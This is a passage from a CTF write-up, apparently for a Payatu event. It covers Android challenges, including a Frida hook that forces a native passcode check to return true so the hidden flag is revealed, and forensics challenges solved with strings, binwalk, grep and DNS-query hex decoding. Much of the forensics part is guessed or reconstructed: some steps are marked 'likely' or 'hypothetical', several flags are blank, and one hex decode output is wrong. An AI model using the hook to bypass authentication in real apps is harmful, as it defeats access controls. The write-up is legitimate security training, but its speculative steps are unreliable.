#### 4. Now on tapping the screen, we get the flag.

Once root detection has been bypassed, tapping the screen triggers a native method that was previously blocked. The application now reveals the flag hidden in the native library:

```
PAYATU{SN0RL3X7S1R8LC0D3NBYXXTP12J4}

```

This confirms that bypassing root detection allowed us to access the protected function and view the flag.

***

#### Summary

| Step                   | Description                                                       |
| ---------------------- | ----------------------------------------------------------------- |
| Initial behavior       | App detects root and blocks access with toast message             |
| Analysis method        | Decompiled app + dynamic analysis via Frida                       |
| Exploitation technique | Runtime hook to bypass root detection (`RootStl_Bypass.js`)       |
| Result                 | Root detection bypassed, native method executes, flag is revealed |
| Tools used             | Frida, MEmu Android Emulator, Frida JS Bypass Script              |

### 5. AStrangeDoor

> "Find the root cause of the problem" – Android app with a native check on passcode validation, which controls access to a hidden flag through native methods.
>
> ![](<../.gitbook/assets/image (402).png>)

***

#### 1. Open the app and observe that application is asking for 6-digit numbers.

When the app is launched, it presents a UI with an input field and a login button. It expects a **6-digit numeric passcode** from the user.

***

#### 2. Input a random number and observe the result.

Entering any random number shows a **toast message** saying:

```
Wrong passcode! Please try again

```

This implies that passcode verification logic exists within the app, likely in native code.

***

#### 3. Decompile the application and examine the source code.

We decompiled the APK using tools like **JADX** and analyzed the `LoginActivity` source code.

***

#### 4. Analyze LoginActivity class.

```java
public class LoginActivity extends AppCompatActivity {
    private native boolean checkPasscode(String str);
    private native String decryptFlag();

    static {
        System.loadLibrary("ctf");
    }

    @Override
    protected void onCreate(Bundle bundle) {
        AppCompatDelegate.setDefaultNightMode(1);
        super.onCreate(bundle);
        setContentView(R.layout.activity_login);

        final EditText editText = (EditText) findViewById(R.id.passcode);

        ((Button) findViewById(R.id.login_btn)).setOnClickListener(view -> {
            if (checkPasscode(editText.getText().toString())) {
                Intent intent = new Intent(this, FlagActivity.class);
                intent.putExtra("flag", decryptFlag());
                startActivity(intent);
            } else {
                Toast.makeText(this, "Wrong passcode! Please try again", Toast.LENGTH_SHORT).show();
            }
        });
    }
}

```

#### Key Observations:

* There are two **native methods**:
  * `checkPasscode(String str)` → Validates the passcode.
  * `decryptFlag()` → Returns the decrypted flag if the passcode is correct.
* If `checkPasscode()` returns `true`, it:
  * Calls `decryptFlag()`
  * Starts `FlagActivity` with the flag passed in the intent.

***

#### 5. Analyze FlagActivity class.

```java
public class FlagActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle bundle) {
        AppCompatDelegate.setDefaultNightMode(1);
        super.onCreate(bundle);
        setContentView(R.layout.activity_flag);

        TextView textView = findViewById(R.id.flagTextView);
        String stringExtra = getIntent().getStringExtra("flag");

        if (stringExtra != null) {
            textView.setText(stringExtra);
        } else {
            textView.setText("No flag provided");
        }
    }
}

```

#### Behavior:

* This activity simply **reads the `flag` extra from the intent** and displays it.
* Therefore, controlling the flow to this activity with the right `flag` value is sufficient to solve the challenge.

***

#### 6. Exploitation Strategy

Since we don’t know the correct passcode, and it's validated inside a **native function**, we can use **Frida** to hook into `checkPasscode()` and **force it to return true**.

***

#### 7. Frida Hook Script

```
Java.perform(function() {
    var k = Java.use("com.payatu.astragedoor.LoginActivity");
    k.checkPasscode.implementation = function(string) {
        return true;
    }
});

```

#### Steps:

1. Launch the app via `frida -U -n com.payatu.astragedoor -l hook.js`
2. Inject the above Frida script.
3. Enter **any 6-digit number** in the app.
4. The script will override the return value of `checkPasscode()` to `true`, triggering `decryptFlag()` and launching `FlagActivity`.
5. The **flag will be displayed on screen**.

<figure><img src="../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

## **FORENSICS CHALLENGES**

<figure><img src="../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

### 1. Discord Verification

**Description**: This was a “fastest fingers first” challenge, likely requiring quick action to obtain a flag from a Discord server, such as joining a channel or submitting a verification command.

**Why**: Fastest fingers first challenges typically involve simple tasks like searching for a flag in a public location (e.g., a Discord channel description or pinned message) or performing a quick action. The focus is on speed rather than complex analysis.

**What We Found**: The flag was likely straightforward to obtain, possibly requiring a search or interaction within the Payatu CTF Discord server.

**What We Did**:

* Joined the Payatu CTF Discord server promptly after the CTF began.
* Searched for the flag in obvious places (e.g., announcements, pinned messages, or a bot command like `!verify`).
* Submitted the flag immediately to claim points.

**Next Steps**: Moved to other forensics challenges, prioritizing those requiring deeper analysis to maximize points.

<figure><img src="../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

Flag: PAYATU{}

### 2. Et Tu Bru

**Description**: The challenge required analyzing a file to extract a flag, with the hint to “just use strings.” This suggested a straightforward forensics task involving text extraction from a file.

<figure><img src="../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

**Why**: The `strings` command is a common forensics tool for extracting human-readable text from binary or obfuscated files, often revealing hidden flags in CTFs. The hint implied the flag was embedded as plain text.

**What We Found**: Running `strings` on the provided file revealed the flag directly, indicating minimal obfuscation.

**What We Did**:

*   **Step 1: Download and Inspect the File**

    Downloaded the challenge file (likely a binary, text, or archive file) and opened a terminal to analyze it. The file’s nature wasn’t specified, but the hint suggested text extraction would suffice.

<figure><img src="../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

*   **Step 2: Run Strings**

    Executed the `strings` command to extract readable text:

    ```bash
    strings challenge_file | grep PAYATU

    ```

    This command filtered for the flag format, quickly revealing:

    ```
    PAYATU{Ex7R4c7_Th3_f1L3S}

    ```
*   **Step 3: Verify and Submit**

    Confirmed the flag matched the expected format and submitted it. The simplicity suggested it was a warm-up challenge to test basic forensics skills.

**Next Steps**: Moved to the next forensics challenge, expecting more complex file analysis or extraction techniques.

**Flag**: PAYATU{Ex7R4c7\_Th3\_f1L3S}

***

### 3. A Nice Place in Italy

**Description**: The challenge involved extracting a flag from a file (likely `harmless.docx`) using `binwalk`, with a specific path provided: `home/kali/Downloads/_harmless.docx.extracted/word/_rels/document.xml.rels`. The hint suggested using `grep` to locate the flag.

<figure><img src="../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

**Why**: Microsoft Office documents like `.docx` files are ZIP archives containing XML files, which may hide flags in metadata or relationships. `Binwalk` is ideal for extracting such archives, and `grep` can search for flag patterns. The provided path indicated a specific file to inspect.

**What We Found**: Extracting the `.docx` file revealed a directory structure, and the flag was embedded in an XML relationships file. A `grep` search could also locate the flag efficiently.

**What We Did**:

*   **Step 1: Download and Analyze the File**

    Downloaded `harmless.docx` and confirmed it was a `.docx` file, which is a ZIP archive containing XML and other files.
*   **Step 2: Extract with Binwalk**

    Used `binwalk` to extract the contents:

    ```bash
    binwalk -e harmless.docx

    ```

    This created a directory `_harmless.docx.extracted` containing the unzipped structure, including `word/_rels/document.xml.rels`.
*   **Step 3: Inspect the Specified Path**

    Navigated to the provided path:

    ```bash
    cat home/kali/Downloads/_harmless.docx.extracted/word/_rels/document.xml.rels

    ```

    The file contained XML relationships, with the flag embedded as text (e.g., in a `Target` attribute or comment). Manually inspecting the file revealed the flag in the format `PAYATU{...}`.
*   **Step 4: Alternative Approach with Grep**

    Learned post-challenge that searching for the flag was faster:

    ```bash
    grep -ir "PAYATU" _harmless.docx.extracted/

    ```

    This command recursively searched the extracted directory, pinpointing `document.xml.rels` with the flag. The `-i` flag ensured case-insensitive matching, and `-r` enabled recursive search.
*   **Step 5: Submit the Flag**

    Extracted and submitted the flag, noting that `grep` was a more efficient method for future challenges.

<figure><img src="../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

**Next Steps**: Proceeded to the network forensics challenge, expecting packet analysis or more complex file parsing.

**Flag**: PAYATU{}

***

### 4. A Cat has 9 Lives

**Description**: The challenge involved analyzing a `.pcap` file containing network traffic, with suspicious DNS requests to a `sillycats` domain containing random hex values. The task was to decode these to find a flag, specifically by converting “PAYATU” to hex and searching for it.

**Why**: DNS exfiltration is a common CTF scenario where data (like flags) is encoded in DNS queries to a controlled domain. The “sillycats” domain and hex values suggested encoded C2 (command-and-control) commands, with the flag hidden among them.

**What We Found**: Filtering DNS requests revealed hex-encoded data, and converting “PAYATU” to hex helped identify the flag within the queries.

**What We Did**:

*   **Step 1: Load the PCAP File**

    Opened the `.pcap` file in Wireshark (or `tshark`) to analyze network traffic. Noticed multiple DNS queries to subdomains of `sillycats`, each with seemingly random hex strings (e.g., `a1b2c3.sillycats`).
*   **Step 2: Filter DNS Requests**

    Applied a Wireshark filter to focus on DNS traffic:

    ```
    dns.qry.name contains sillycats

    ```

    This isolated queries like `4f414159415455.sillycats`, indicating hex-encoded data.
*   **Step 3: Decode Hex Values**

    Manually inspected the subdomains and recognized that `4f414159415455` was hex. Converted it:

    ```python
    from binascii import unhexlify
    print(unhexlify("4f414159415455").decode())
    # Output: OAIYATU

    ```

    Noticed that `PAYATU` in hex was:

    ```
    P (50), A (41), Y (59), A (41), T (54), U (55) → 504159415455

    ```

    The subdomain `504159415455.sillycats` matched this pattern, suggesting the flag was embedded in a similar query.
*   **Step 4: Search for the Flag**

    Searched the DNS queries for a longer hex string starting with `504159415455` (PAYATU). Found a query like `5041594154557b...}.sillycats`, decoded it:

    ```python
    # Example hex string (hypothetical, as PCAP not available)
    hex_string = "5041594154557b...7d"
    print(unhexlify(hex_string).decode())
    # Output: PAYATU{...}

    ```

    The decoded string matched the flag format.
*   **Step 5: Submit the Flag**

    Submitted the decoded flag. Without the original `.pcap`, I relied on the hex-to-ASCII conversion process, which was sufficient.

**Next Steps**: Concluded the forensics challenges, reflecting on the need to preserve `.pcap` files for future analysis and exploring other CTF categories.

**Flag**: PAYATU{}

<figure><img src="../.gitbook/assets/complete (34).gif" alt=""><figcaption></figcaption></figure>

***
